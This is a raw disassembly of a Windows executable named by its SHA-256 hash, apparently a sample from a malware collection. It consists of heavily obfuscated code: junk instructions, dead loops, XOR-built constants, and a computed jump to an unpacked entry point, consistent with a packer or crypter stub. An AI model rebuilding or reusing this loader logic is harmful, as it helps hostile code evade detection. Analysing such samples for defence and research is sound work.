
b0d3b324cff1a4a3d80d54bf572ddd13a33226afca69f785f132b9d47879e8b9.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0xcc
  401009:	xor    DWORD PTR ds:0x422014,0x420f98
  401013:	push   edi
  401014:	sub    DWORD PTR ds:0x420fb0,0x420e8e
  40101e:	push   0x424545
  401023:	xor    edi,edi
  401025:	and    DWORD PTR ds:0x420efc,0x110f
  40102f:	inc    edi
  401030:	push   edi
  401031:	sbb    DWORD PTR ds:0x420f08,0x51
  40103b:	push   edi
  40103c:	adc    DWORD PTR ds:0x422000,0x3888
  401046:	call   DWORD PTR ds:0x4247ed
  40104c:	test   eax,eax
  40104e:	mov    DWORD PTR ds:0x420e8a,0x96
  401058:	je     0x40106f
  40105e:	xor    eax,eax
  401060:	mov    DWORD PTR ds:0x420ef0,0x42a7
  40106a:	jmp    0x4020ba
  40106f:	push   esi
  401070:	sbb    DWORD PTR ds:0x420e96,ebx
  401076:	mov    esi,DWORD PTR ds:0x4247e9
  40107c:	push   0x8
  40107e:	and    DWORD PTR ds:0x420e96,0x420ef4
  401088:	push   0x424565
  40108d:	sbb    DWORD PTR ds:0x420fa8,0x2663
  401097:	call   esi
  401099:	mov    DWORD PTR ds:0x420f58,0x2539
  4010a3:	test   eax,eax
  4010a5:	mov    DWORD PTR ds:0x420f74,0x63dd
  4010af:	jne    0x401117
  4010b5:	push   0xc
  4010b7:	adc    DWORD PTR ds:0x420efc,0x422010
  4010c1:	push   0x424579
  4010c6:	call   esi
  4010c8:	sbb    DWORD PTR ds:0x422000,0x6696
  4010d2:	test   eax,eax
  4010d4:	jne    0x401117
  4010da:	xor    DWORD PTR ds:0x422010,0x3be2
  4010e4:	push   0x42458d
  4010e9:	adc    DWORD PTR ds:0x420fac,0x420fa0
  4010f3:	push   edi
  4010f4:	push   edi
  4010f5:	call   DWORD PTR ds:0x424819
  4010fb:	add    DWORD PTR ds:0x420e7e,0x14dc
  401105:	test   eax,eax
  401107:	mov    DWORD PTR ds:0x420f08,0x3170
  401111:	je     0x401128
  401117:	xor    eax,eax
  401119:	mov    DWORD PTR ds:0x422014,0x5c19
  401123:	jmp    0x4020b9
  401128:	sbb    esi,DWORD PTR ds:0x420e9a
  40112e:	mov    DWORD PTR [ebp-0x10],0x0
  401135:	and    edi,0x6e17
  40113b:	mov    eax,DWORD PTR [ebp-0x24]
  40113e:	mov    DWORD PTR [ebp-0x24],eax
  401141:	sub    esi,DWORD PTR ds:0x420fa0
  401147:	mov    ecx,0xf89c85b5
  40114c:	mov    DWORD PTR [ebp-0x8],ecx
  40114f:	sub    esi,DWORD PTR ds:0x420f00
  401155:	mov    DWORD PTR [ebp-0xc],0xf89c85b2
  40115c:	sbb    edx,DWORD PTR ds:0x420e92
  401162:	lea    eax,[ebp-0x38]
  401165:	mov    DWORD PTR [ebp-0x2c],eax
  401168:	adc    DWORD PTR ds:0x420f74,edi
  40116e:	lea    eax,[ebp-0x30]
  401171:	xor    esi,esi
  401173:	or     esi,DWORD PTR ds:0x420e9a
  401179:	and    DWORD PTR ds:0x420f64,esi
  40117f:	mov    DWORD PTR [ebp-0x1c],eax
  401182:	sbb    esi,eax
  401184:	mov    eax,ds:0x424435
  401189:	mov    edi,DWORD PTR ds:0x420f48
  40118f:	mov    edx,DWORD PTR ds:0x420f84
  401195:	sub    edx,edi
  401197:	sub    edi,DWORD PTR [edi+edx*1]
  40119a:	mov    eax,DWORD PTR [eax+0x1c8]
  4011a0:	mov    eax,DWORD PTR [eax]
  4011a2:	mov    edx,DWORD PTR [ebp-0x1c]
  4011a5:	movzx  edi,BYTE PTR ds:0x420fb4
  4011ac:	add    DWORD PTR ds:0x420e8a,edi
  4011b2:	mov    esi,0x7510896
  4011b7:	xor    eax,esi
  4011b9:	and    DWORD PTR ds:0x420fa0,0x420e96
  4011c3:	mov    edi,0x3272dd
  4011c8:	add    eax,edi
  4011ca:	mov    DWORD PTR [edx],eax
  4011cc:	mov    DWORD PTR ds:0x420ea2,0x7e11
  4011d6:	mov    eax,ds:0x424675
  4011db:	cmp    eax,0x312bc9f6
  4011e0:	mov    DWORD PTR ds:0x420fa4,0x3707
  4011ea:	jne    0x40133f
  4011f0:	mov    eax,DWORD PTR [ebp-0x8]
  4011f3:	mov    edx,DWORD PTR ds:0x424435
  4011f9:	mov    edx,DWORD PTR [edx+0x198]
  4011ff:	xor    eax,esi
  401201:	add    eax,edi
  401203:	add    DWORD PTR ds:0x422010,0x420eec
  40120d:	mov    DWORD PTR [edx],eax
  40120f:	and    DWORD PTR ds:0x42200c,0x0
  401219:	jmp    0x40122d
  40121e:	xor    edx,edx
  401220:	add    edx,DWORD PTR ds:0x42200c
  401226:	inc    edx
  401227:	mov    DWORD PTR ds:0x42200c,edx
  40122d:	cmp    DWORD PTR ds:0x42200c,0x12
  401234:	jae    0x401276
  40123a:	cmp    DWORD PTR ds:0x42200c,0x5
  401241:	jne    0x401255
  401247:	push   DWORD PTR [ebp-0x18]
  40124a:	push   0x450b
  40124f:	call   DWORD PTR ds:0x4247d5
  401255:	cmp    DWORD PTR ds:0x42200c,0x4
  40125c:	jne    0x401271
  401262:	xor    edx,edx
  401264:	add    edx,DWORD PTR ds:0x42200c
  40126a:	inc    edx
  40126b:	mov    DWORD PTR ds:0x42200c,edx
  401271:	jmp    0x40121e
  401276:	mov    eax,DWORD PTR [ebp-0x8]
  401279:	and    DWORD PTR ds:0x420f70,0x0
  401283:	mov    edx,DWORD PTR ds:0x420f70
  401289:	inc    edx
  40128a:	mov    DWORD PTR ds:0x420f70,edx
  401290:	cmp    DWORD PTR ds:0x420f70,0x7
  401297:	jne    0x4012b0
  40129d:	push   0x5d66
  4012a2:	push   0x420f60
  4012a7:	push   DWORD PTR [ebp-0x14]
  4012aa:	call   DWORD PTR ds:0x4247d9
  4012b0:	cmp    DWORD PTR ds:0x420f70,0x6
  4012b7:	jne    0x4012ca
  4012bd:	mov    edx,DWORD PTR ds:0x420f70
  4012c3:	inc    edx
  4012c4:	mov    DWORD PTR ds:0x420f70,edx
  4012ca:	cmp    DWORD PTR ds:0x420f70,0x14
  4012d1:	jb     0x401283
  4012d7:	and    edx,0x4d07
  4012dd:	xor    eax,esi
  4012df:	movzx  edx,BYTE PTR ds:0x420f08
  4012e6:	sub    edx,DWORD PTR ds:0x420fa0
  4012ec:	mov    DWORD PTR ds:0x420f08,edx
  4012f2:	add    eax,edi
  4012f4:	mov    DWORD PTR ds:0x422008,0x18
  4012fe:	cmp    DWORD PTR ds:0x422008,0x0
  401305:	je     0x40133a
  40130b:	cmp    DWORD PTR ds:0x422008,0x1d
  401312:	jne    0x401328
  401318:	push   0x42406a
  40131d:	push   0x424044
  401322:	call   DWORD PTR ds:0x4247dd
  401328:	mov    edx,DWORD PTR ds:0x422008
  40132e:	dec    edx
  40132f:	mov    DWORD PTR ds:0x422008,edx
  401335:	jmp    0x4012fe
  40133a:	mov    ds:0x424675,eax
  40133f:	mov    eax,ds:0x424435
  401344:	and    DWORD PTR ds:0x420ef4,0x0
  40134e:	mov    edx,DWORD PTR ds:0x420ef4
  401354:	inc    edx
  401355:	mov    DWORD PTR ds:0x420ef4,edx
  40135b:	cmp    DWORD PTR ds:0x420ef4,0x20
  401362:	jne    0x401379
  401368:	push   DWORD PTR [ebp-0x18]
  40136b:	push   0x222d
  401370:	push   DWORD PTR [ebp-0x28]
  401373:	call   DWORD PTR ds:0x4247e1
  401379:	cmp    DWORD PTR ds:0x420ef4,0x12
  401380:	jb     0x40134e
  401386:	mov    eax,DWORD PTR [eax+0x18c]
  40138c:	mov    eax,DWORD PTR [eax]
  40138e:	adc    DWORD PTR ds:0x422014,0x7308
  401398:	mov    DWORD PTR [ebp-0x68],eax
  40139b:	and    DWORD PTR ds:0x420e7e,0x0
  4013a5:	xor    eax,eax
  4013a7:	or     eax,DWORD PTR ds:0x420e7e
  4013ad:	inc    eax
  4013ae:	mov    ds:0x420e7e,eax
  4013b3:	cmp    DWORD PTR ds:0x420e7e,0xa
  4013ba:	jne    0x4013d1
  4013c0:	push   DWORD PTR [ebp-0x20]
  4013c3:	push   0x420f74
  4013c8:	push   DWORD PTR [ebp-0x28]
  4013cb:	call   DWORD PTR ds:0x4247e5
  4013d1:	cmp    DWORD PTR ds:0x420e7e,0x9
  4013d8:	jne    0x4013ec
  4013de:	xor    eax,eax
  4013e0:	xor    eax,DWORD PTR ds:0x420e7e
  4013e6:	inc    eax
  4013e7:	mov    ds:0x420e7e,eax
  4013ec:	cmp    DWORD PTR ds:0x420e7e,0x14
  4013f3:	jb     0x4013a5
  4013f9:	mov    DWORD PTR ds:0x420f04,0x16
  401403:	cmp    DWORD PTR ds:0x420f04,0x0
  40140a:	je     0x401438
  401410:	cmp    DWORD PTR ds:0x420f04,0x22
  401417:	jne    0x401423
  40141d:	call   DWORD PTR ds:0x4247f1
  401423:	xor    eax,eax
  401425:	or     eax,DWORD PTR ds:0x420f04
  40142b:	dec    eax
  40142c:	mov    ds:0x420f04,eax
  401431:	jmp    0x401403
  401436:	sub    edx,edx
  401438:	push   ebx
  401439:	or     eax,DWORD PTR ds:0x420f00
  40143f:	mov    ebx,0xf89c85b1
  401444:	and    DWORD PTR ds:0x420fa0,0x0
  40144e:	mov    edx,DWORD PTR ds:0x420fa0
  401454:	inc    edx
  401455:	mov    DWORD PTR ds:0x420fa0,edx
  40145b:	cmp    DWORD PTR ds:0x420fa0,0x8
  401462:	jne    0x40146e
  401468:	call   DWORD PTR ds:0x4247f5
  40146e:	cmp    DWORD PTR ds:0x420fa0,0x7
  401475:	jne    0x40148a
  40147b:	xor    edx,edx
  40147d:	xor    edx,DWORD PTR ds:0x420fa0
  401483:	inc    edx
  401484:	mov    DWORD PTR ds:0x420fa0,edx
  40148a:	cmp    DWORD PTR ds:0x420fa0,0x1e
  401491:	jb     0x40144e
  401497:	and    DWORD PTR ds:0x420e7a,0x0
  4014a1:	jmp    0x4014b3
  4014a6:	mov    edx,DWORD PTR ds:0x420e7a
  4014ac:	inc    edx
  4014ad:	mov    DWORD PTR ds:0x420e7a,edx
  4014b3:	cmp    DWORD PTR ds:0x420e7a,0x14
  4014ba:	jae    0x4014ff
  4014c0:	cmp    DWORD PTR ds:0x420e7a,0x1f
  4014c7:	jne    0x4014f0
  4014cd:	push   0x20c6
  4014d2:	push   DWORD PTR [ebp-0x10]
  4014d5:	push   0x420ea2
  4014da:	push   0x440c
  4014df:	push   DWORD PTR [ebp-0x20]
  4014e2:	push   0x7f92
  4014e7:	push   DWORD PTR [ebp-0x20]
  4014ea:	call   DWORD PTR ds:0x4247f9
  4014f0:	jmp    0x4014a6
  4014f5:	adc    DWORD PTR ds:0x420ea2,0x7cfc
  4014ff:	mov    DWORD PTR [ebp-0x10],ebx
  401502:	sub    DWORD PTR ds:0x420f5c,edi
  401508:	mov    DWORD PTR [ebp-0x10],ebx
  40150b:	mov    DWORD PTR ds:0x420f04,0x12
  401515:	cmp    DWORD PTR ds:0x420f04,0x0
  40151c:	je     0x40156b
  401522:	cmp    DWORD PTR ds:0x420f04,0x5
  401529:	jne    0x40153d
  40152f:	push   DWORD PTR [ebp-0x1c]
  401532:	push   0x424044
  401537:	call   DWORD PTR ds:0x4247fd
  40153d:	cmp    DWORD PTR ds:0x420f04,0x6
  401544:	jne    0x401557
  40154a:	mov    edx,DWORD PTR ds:0x420f04
  401550:	dec    edx
  401551:	mov    DWORD PTR ds:0x420f04,edx
  401557:	xor    edx,edx
  401559:	or     edx,DWORD PTR ds:0x420f04
  40155f:	dec    edx
  401560:	mov    DWORD PTR ds:0x420f04,edx
  401566:	jmp    0x401515
  40156b:	mov    DWORD PTR [ebp-0x10],ebx
  40156e:	and    DWORD PTR ds:0x422004,0x0
  401578:	jmp    0x40158c
  40157d:	xor    edx,edx
  40157f:	xor    edx,DWORD PTR ds:0x422004
  401585:	inc    edx
  401586:	mov    DWORD PTR ds:0x422004,edx
  40158c:	cmp    DWORD PTR ds:0x422004,0x12
  401593:	jae    0x4015bd
  401599:	cmp    DWORD PTR ds:0x422004,0x1e
  4015a0:	jne    0x4015b8
  4015a6:	push   0x424168
  4015ab:	push   0x1
  4015ad:	push   0x0
  4015af:	push   DWORD PTR [ebp-0x14]
  4015b2:	call   DWORD PTR ds:0x424801
  4015b8:	jmp    0x40157d
  4015bd:	mov    DWORD PTR [ebp-0x1c],ecx
  4015c0:	xor    edx,edx
  4015c2:	mov    DWORD PTR [ebp-0x10],ebx
  4015c5:	mov    DWORD PTR ds:0x420e96,0xb45
  4015cf:	mov    DWORD PTR [ebp-0x10],0xf89c85bd
  4015d6:	and    DWORD PTR ds:0x422014,0x2ed5
  4015e0:	mov    eax,DWORD PTR [ebp-0x8]
  4015e3:	mov    ecx,DWORD PTR [ebp-0xc]
  4015e6:	xor    edx,edx
  4015e8:	or     edx,DWORD PTR ds:0x420f60
  4015ee:	and    DWORD PTR ds:0x422000,edx
  4015f4:	mov    edx,DWORD PTR [ebp-0xc]
  4015f7:	sbb    DWORD PTR ds:0x420fa0,0x420fb4
  401601:	xor    edx,esi
  401603:	and    DWORD PTR ds:0x420f5c,0x420fa4
  40160d:	xor    ecx,esi
  40160f:	sub    DWORD PTR ds:0x422008,0x420f58
  401619:	add    ecx,edx
  40161b:	sbb    DWORD PTR ds:0x420e8e,edi
  401621:	mov    edx,DWORD PTR [ebp-0xc]
  401624:	xor    DWORD PTR ds:0x420f00,0x7b1e
  40162e:	xor    eax,esi
  401630:	xor    edx,esi
  401632:	or     DWORD PTR ds:0x420e9a,0x7d42
  40163c:	add    eax,edi
  40163e:	lea    ecx,[ecx+edx*1+0x975897]
  401645:	not    DWORD PTR ds:0x420f70
  40164b:	mov    DWORD PTR [ebp-0x18],eax
  40164e:	mov    DWORD PTR ds:0x420e7e,0x57b9
  401658:	cmp    eax,ecx
  40165a:	ja     0x40177e
  401660:	jmp    0x401678
  401665:	mov    eax,ds:0x420f30
  40166a:	mov    ecx,DWORD PTR ds:0x420f38
  401670:	sub    ecx,eax
  401672:	and    eax,DWORD PTR [eax+ecx*1]
  401675:	mov    eax,DWORD PTR [ebp-0x18]
  401678:	mov    ecx,DWORD PTR [ebp-0xc]
  40167b:	sub    DWORD PTR ds:0x422010,0x420f70
  401685:	xor    ecx,esi
  401687:	lea    eax,[ecx+eax*1+0x3272dd]
  40168e:	or     DWORD PTR ds:0x420f70,0x48c8
  401698:	push   eax
  401699:	sub    DWORD PTR ds:0x420e9e,0x506d
  4016a3:	mov    eax,DWORD PTR [ebp-0x1c]
  4016a6:	and    DWORD PTR ds:0x420f5c,0x3822
  4016b0:	xor    eax,esi
  4016b2:	xor    DWORD PTR ds:0x420f74,0x420ef0
  4016bc:	lea    eax,[ebp+eax*1+0x3272e5]
  4016c3:	or     DWORD PTR ds:0x420ea2,0x420f60
  4016cd:	push   eax
  4016ce:	or     DWORD PTR ds:0x420f00,0x5827
  4016d8:	mov    eax,ds:0x424435
  4016dd:	and    DWORD PTR ds:0x420fb4,0x420fa4
  4016e7:	push   DWORD PTR [eax+0x1bc]
  4016ed:	xor    DWORD PTR ds:0x420f98,0x420ea2
  4016f7:	call   0x4020cd
  4016fc:	add    DWORD PTR ds:0x420f68,0x6b04
  401706:	mov    eax,DWORD PTR [ebp-0xc]
  401709:	or     edx,DWORD PTR ds:0x420ef0
  40170f:	mov    ecx,DWORD PTR [ebp-0x18]
  401712:	neg    edx
  401714:	xor    eax,esi
  401716:	sub    edx,0x4f8d
  40171c:	lea    eax,[ecx+eax*1+0x3272dd]
  401723:	mov    ecx,DWORD PTR [ebp-0xc]
  401726:	xor    edx,DWORD PTR ds:0x420e7a
  40172c:	mov    edx,DWORD PTR [ebp-0xc]
  40172f:	xor    edx,esi
  401731:	add    DWORD PTR ds:0x420ef4,0x420e9e
  40173b:	xor    ecx,esi
  40173d:	adc    DWORD PTR ds:0x420e82,0x420f5c
  401747:	add    ecx,edx
  401749:	mov    edx,DWORD PTR [ebp-0xc]
  40174c:	xor    edx,esi
  40174e:	lea    ecx,[ecx+edx*1+0x975897]
  401755:	mov    DWORD PTR ds:0x420e82,0x59f5
  40175f:	mov    DWORD PTR [ebp-0x18],eax
  401762:	mov    DWORD PTR ds:0x420f98,0x3280
  40176c:	cmp    eax,ecx
  40176e:	mov    DWORD PTR ds:0x420fb4,0x7b83
  401778:	jbe    0x401665
  40177e:	and    DWORD PTR ds:0x420f98,0x0
  401788:	mov    ecx,DWORD PTR ds:0x420f98
  40178e:	inc    ecx
  40178f:	mov    DWORD PTR ds:0x420f98,ecx
  401795:	cmp    DWORD PTR ds:0x420f98,0x1e
  40179c:	jne    0x4017b2
  4017a2:	push   0x420fa0
  4017a7:	push   0x4d18
  4017ac:	call   DWORD PTR ds:0x424805
  4017b2:	cmp    DWORD PTR ds:0x420f98,0x18
  4017b9:	jb     0x401788
  4017bf:	mov    eax,DWORD PTR [ebp+0xc]
  4017c2:	sbb    DWORD PTR ds:0x420e7a,edx
  4017c8:	mov    ds:0x4242b9,eax
  4017cd:	and    DWORD PTR ds:0x420f74,0x0
  4017d7:	mov    eax,ds:0x420f74
  4017dc:	inc    eax
  4017dd:	mov    ds:0x420f74,eax
  4017e2:	cmp    DWORD PTR ds:0x420f74,0x1b
  4017e9:	jne    0x40180f
  4017ef:	push   DWORD PTR [ebp-0x1c]
  4017f2:	push   0x420f9c
  4017f7:	push   0x46e8
  4017fc:	push   0x4240e4
  401801:	push   0x1c79
  401806:	push   DWORD PTR [ebp-0xc]
  401809:	call   DWORD PTR ds:0x42480d
  40180f:	cmp    DWORD PTR ds:0x420f74,0x12
  401816:	jb     0x4017d7
  40181c:	mov    eax,DWORD PTR [ebp+0x10]
  40181f:	sub    ecx,DWORD PTR ds:0x420fa4
  401825:	mov    ds:0x42450d,eax
  40182a:	and    DWORD PTR ds:0x422010,0x0
  401834:	mov    eax,ds:0x422010
  401839:	inc    eax
  40183a:	mov    ds:0x422010,eax
  40183f:	cmp    DWORD PTR ds:0x422010,0x18
  401846:	jne    0x401852
  40184c:	call   DWORD PTR ds:0x424811
  401852:	cmp    DWORD PTR ds:0x422010,0x17
  401859:	jb     0x401834
  40185f:	add    ecx,ecx
  401861:	mov    eax,ds:0x4242b9
  401866:	or     DWORD PTR ds:0x420e7a,0x2e1b
  401870:	mov    ecx,DWORD PTR [ebp-0x2c]
  401873:	sub    eax,edi
  401875:	neg    DWORD PTR ds:0x420e92
  40187b:	xor    eax,esi
  40187d:	mov    DWORD PTR ds:0x420fac,0x2c59
  401887:	mov    DWORD PTR [ecx],eax
  401889:	mov    ecx,DWORD PTR [ebp-0x24]
  40188c:	mov    DWORD PTR ds:0x420efc,0x2f09
  401896:	mov    eax,0xf89c85b5
  40189b:	mov    DWORD PTR ds:0x420efc,0x2084
  4018a5:	cmp    ecx,eax
  4018a7:	jne    0x401be5
  4018ad:	xor    DWORD PTR ds:0x422014,0x4966
  4018b7:	lea    eax,[ebp-0x34]
  4018ba:	adc    DWORD PTR ds:0x420e8a,0x420e92
  4018c4:	mov    DWORD PTR [ebp-0x70],eax
  4018c7:	xor    DWORD PTR ds:0x420f74,0x422004
  4018d1:	lea    eax,[ebp+0x4]
  4018d4:	sub    DWORD PTR ds:0x420fa4,0x42200c
  4018de:	mov    DWORD PTR [ebp-0x34],eax
  4018e1:	mov    eax,DWORD PTR [ebp-0x34]
  4018e4:	test   eax,eax
  4018e6:	mov    DWORD PTR ds:0x420e82,0x6242
  4018f0:	je     0x40209d
  4018f6:	xor    DWORD PTR ds:0x422008,0x2d73
  401900:	mov    eax,DWORD PTR [ebp-0x20]
  401903:	mov    eax,DWORD PTR [ebp-0xc]
  401906:	mov    eax,DWORD PTR [ebp-0x8]
  401909:	adc    ecx,0x7834
  40190f:	mov    DWORD PTR [ebp+0xc],eax
  401912:	not    ecx
  401914:	mov    eax,eax
  401916:	mov    eax,ds:0x424435
  40191b:	and    DWORD PTR ds:0x422008,0x0
  401925:	mov    ecx,DWORD PTR ds:0x422008
  40192b:	inc    ecx
  40192c:	mov    DWORD PTR ds:0x422008,ecx
  401932:	cmp    DWORD PTR ds:0x422008,0x1e
  401939:	jne    0x40194a
  40193f:	push   0x422000
  401944:	call   DWORD PTR ds:0x424815
  40194a:	cmp    DWORD PTR ds:0x422008,0x1d
  401951:	jb     0x401925
  401957:	and    DWORD PTR ds:0x420fa0,0x0
  401961:	jmp    0x401973
  401966:	mov    ecx,DWORD PTR ds:0x420fa0
  40196c:	inc    ecx
  40196d:	mov    DWORD PTR ds:0x420fa0,ecx
  401973:	cmp    DWORD PTR ds:0x420fa0,0x14
  40197a:	jae    0x4019bc
  401980:	cmp    DWORD PTR ds:0x420fa0,0x5
  401987:	jne    0x40199d
  40198d:	push   0x2f20
  401992:	push   0x8e83
  401997:	call   DWORD PTR ds:0x4247d5
  40199d:	cmp    DWORD PTR ds:0x420fa0,0x4
  4019a4:	jne    0x4019b7
  4019aa:	mov    ecx,DWORD PTR ds:0x420fa0
  4019b0:	inc    ecx
  4019b1:	mov    DWORD PTR ds:0x420fa0,ecx
  4019b7:	jmp    0x401966
  4019bc:	mov    eax,DWORD PTR [eax+0x1c8]
  4019c2:	neg    DWORD PTR ds:0x420f98
  4019c8:	mov    eax,DWORD PTR [eax]
  4019ca:	sbb    DWORD PTR ds:0x420f74,ebx
  4019d0:	cdq    
  4019d1:	adc    DWORD PTR ds:0x42200c,0x4213
  4019db:	mov    ebx,eax
  4019dd:	mov    DWORD PTR ds:0x420fa4,0x17
  4019e7:	cmp    DWORD PTR ds:0x420fa4,0x0
  4019ee:	je     0x401a74
  4019f4:	cmp    DWORD PTR ds:0x420fa4,0x20
  4019fb:	jne    0x401a14
  401a01:	push   DWORD PTR [ebp-0x1c]
  401a04:	push   0x420e9a
  401a09:	push   0x6482
  401a0e:	call   DWORD PTR ds:0x4247d9
  401a14:	xor    eax,eax
  401a16:	or     eax,DWORD PTR ds:0x420fa4
  401a1c:	dec    eax
  401a1d:	mov    ds:0x420fa4,eax
  401a22:	jmp    0x4019e7
  401a27:	mov    DWORD PTR ds:0x420f08,0x1d
  401a31:	cmp    DWORD PTR ds:0x420f08,0x0
  401a38:	je     0x401a74
  401a3e:	cmp    DWORD PTR ds:0x420f08,0x1e
  401a45:	jne    0x401a5b
  401a4b:	push   0x424027
  401a50:	push   0x4240af
  401a55:	call   DWORD PTR ds:0x4247dd
  401a5b:	xor    eax,eax
  401a5d:	xor    eax,DWORD PTR ds:0x420f08
  401a63:	dec    eax
  401a64:	mov    ds:0x420f08,eax
  401a69:	jmp    0x401a31
  401a6e:	and    DWORD PTR ds:0x420e82,ebx
  401a74:	mov    eax,0xfabdbeed
  401a79:	add    ebx,eax
  401a7b:	inc    ecx
  401a7c:	adc    edx,0xffffffff
  401a7f:	mov    DWORD PTR ds:0x420fa0,0x16
  401a89:	cmp    DWORD PTR ds:0x420fa0,0x0
  401a90:	je     0x401b11
  401a96:	cmp    DWORD PTR ds:0x420fa0,0x20
  401a9d:	jne    0x401ab4
  401aa3:	push   DWORD PTR [ebp-0x10]
  401aa6:	push   0x1d23
  401aab:	push   DWORD PTR [ebp-0x1c]
  401aae:	call   DWORD PTR ds:0x4247e1
  401ab4:	xor    ecx,ecx
  401ab6:	xor    ecx,DWORD PTR ds:0x420fa0
  401abc:	dec    ecx
  401abd:	mov    DWORD PTR ds:0x420fa0,ecx
  401ac3:	jmp    0x401a89
  401ac8:	mov    DWORD PTR ds:0x42200c,0x1c
  401ad2:	cmp    DWORD PTR ds:0x42200c,0x0
  401ad9:	je     0x401b11
  401adf:	cmp    DWORD PTR ds:0x42200c,0x2c
  401ae6:	jne    0x401aff
  401aec:	push   0x87f3
  401af1:	push   0x420f68
  401af6:	push   DWORD PTR [ebp-0xc]
  401af9:	call   DWORD PTR ds:0x4247e5
  401aff:	mov    ecx,DWORD PTR ds:0x42200c
  401b05:	dec    ecx
  401b06:	mov    DWORD PTR ds:0x42200c,ecx
  401b0c:	jmp    0x401ad2
  401b11:	and    DWORD PTR [ebp-0x10],0x0
  401b15:	sbb    DWORD PTR ds:0x422014,ebx
  401b1b:	xor    edx,0x0
  401b1e:	xor    ecx,DWORD PTR ds:0x420f70
  401b24:	mov    DWORD PTR [ebp-0x54],edx
  401b27:	adc    ecx,edx
  401b29:	mov    edx,DWORD PTR [ebp+0xc]
  401b2c:	mov    DWORD PTR [ebp-0x14],edx
  401b2f:	mov    ecx,0x8a29a127
  401b34:	xor    ebx,ecx
  401b36:	dec    edx
  401b37:	add    DWORD PTR [ebp-0x14],eax
  401b3a:	mov    DWORD PTR ds:0x420e96,edi
  401b40:	mov    edx,DWORD PTR [ebp-0x14]
  401b43:	adc    DWORD PTR [ebp-0x10],0xffffffff
  401b47:	or     DWORD PTR ds:0x420f6c,0x420f00
  401b51:	xor    edx,ecx
  401b53:	add    DWORD PTR ds:0x420e86,0x420f04
  401b5d:	mov    DWORD PTR [ebp-0x4c],edx
  401b60:	mov    edx,DWORD PTR [ebp-0x10]
  401b63:	xor    edx,0x0
  401b66:	mov    DWORD PTR [ebp-0x48],edx
  401b69:	mov    DWORD PTR ds:0x420efc,0x3c82
  401b73:	cmp    DWORD PTR [ebp-0x4c],ebx
  401b76:	jne    0x401b92
  401b7c:	mov    DWORD PTR ds:0x420e92,0x5ff4
  401b86:	mov    edx,DWORD PTR [ebp-0x54]
  401b89:	cmp    DWORD PTR [ebp-0x48],edx
  401b8c:	je     0x401bc1
  401b92:	mov    edx,DWORD PTR ds:0x424435
  401b98:	mov    edx,DWORD PTR [edx+0x1c0]
  401b9e:	mov    edx,DWORD PTR [edx]
  401ba0:	xor    ebx,ebx
  401ba2:	add    edx,eax
  401ba4:	adc    ebx,0xffffffff
  401ba7:	xor    edx,ecx
  401ba9:	xor    ebx,0x0
  401bac:	cmp    edx,0x70941fc9
  401bb2:	jne    0x40209d
  401bb8:	cmp    ebx,0xffffffff
  401bbb:	jne    0x40209d
  401bc1:	mov    edx,DWORD PTR ds:0x4244b1
  401bc7:	mov    ebx,DWORD PTR ds:0x4244b9
  401bcd:	xor    edx,ebx
  401bcf:	mov    DWORD PTR ds:0x4244b1,edx
  401bd5:	mov    ebx,DWORD PTR ds:0x4244b1
  401bdb:	mov    edx,DWORD PTR [ebp-0x34]
  401bde:	add    DWORD PTR [edx],ebx
  401be0:	jmp    0x40205e
  401be5:	mov    ecx,DWORD PTR [ebp-0x38]
  401be8:	cmp    ecx,0xf89c85b2
  401bee:	je     0x401c4b
  401bf4:	mov    ecx,DWORD PTR [ebp-0x8]
  401bf7:	mov    edx,DWORD PTR [ebp-0x30]
  401bfa:	xor    ecx,esi
  401bfc:	add    ecx,edi
  401bfe:	cmp    ecx,edx
  401c00:	je     0x401c4b
  401c06:	mov    eax,ds:0x424435
  401c0b:	mov    eax,DWORD PTR [eax+0x194]
  401c11:	mov    ecx,DWORD PTR [eax]
  401c13:	mov    eax,DWORD PTR [ecx+0x3c]
  401c16:	push   DWORD PTR ds:0x42450d
  401c1c:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  401c20:	push   DWORD PTR ds:0x4242b9
  401c26:	add    eax,ecx
  401c28:	mov    ecx,DWORD PTR ds:0x424435
  401c2e:	mov    ecx,DWORD PTR [ecx+0x194]
  401c34:	push   DWORD PTR [ecx]
  401c36:	call   eax
  401c38:	mov    ecx,DWORD PTR ds:0x424435
  401c3e:	mov    ecx,DWORD PTR [ecx+0x1cc]
  401c44:	mov    DWORD PTR [ecx],eax
  401c46:	jmp    0x40209d
  401c4b:	mov    ecx,DWORD PTR [ebp-0x8]
  401c4e:	mov    edx,DWORD PTR [ebp-0x68]
  401c51:	xor    ecx,esi
  401c53:	add    ecx,edi
  401c55:	cmp    ecx,edx
  401c57:	jne    0x401f61
  401c5d:	mov    ecx,DWORD PTR [ebp-0x8]
  401c60:	mov    edx,DWORD PTR ds:0x424435
  401c66:	mov    edx,DWORD PTR [edx+0x198]
  401c6c:	xor    ecx,esi
  401c6e:	add    ecx,edi
  401c70:	cmp    ecx,DWORD PTR [edx]
  401c72:	jne    0x401c8d
  401c78:	push   eax
  401c79:	mov    eax,DWORD PTR [ebp-0x8]
  401c7c:	xor    eax,esi
  401c7e:	add    eax,edi
  401c80:	push   eax
  401c81:	push   ebx
  401c82:	push   DWORD PTR [ebp-0xc]
  401c85:	push   DWORD PTR [ebp-0x8]
  401c88:	call   0x40772b
  401c8d:	mov    eax,DWORD PTR [ebp-0xc]
  401c90:	mov    DWORD PTR [ebp-0x3c],eax
  401c93:	mov    eax,DWORD PTR [ebp-0x8]
  401c96:	mov    DWORD PTR [ebp-0x18],eax
  401c99:	mov    eax,DWORD PTR [ebp-0x18]
  401c9c:	xor    eax,esi
  401c9e:	add    eax,edi
  401ca0:	mov    DWORD PTR [ebp+0x10],eax
  401ca3:	mov    eax,ds:0x4242b5
  401ca8:	mov    eax,DWORD PTR [eax]
  401caa:	mov    DWORD PTR [ebp+0x10],eax
  401cad:	mov    eax,ds:0x4244bd
  401cb2:	mov    eax,DWORD PTR [eax]
  401cb4:	mov    DWORD PTR [ebp-0x1c],eax
  401cb7:	mov    DWORD PTR [ebp+0xc],0xf89c87b5
  401cbe:	mov    eax,DWORD PTR [ebp+0xc]
  401cc1:	xor    eax,esi
  401cc3:	add    eax,edi
  401cc5:	mov    DWORD PTR [ebp+0xc],eax
  401cc8:	mov    eax,ds:0x424435
  401ccd:	mov    DWORD PTR [ebp+0xc],eax
  401cd0:	mov    eax,DWORD PTR [ebp+0x10]
  401cd3:	mov    DWORD PTR [ebp+0xc],eax
  401cd6:	mov    eax,DWORD PTR [ebp+0xc]
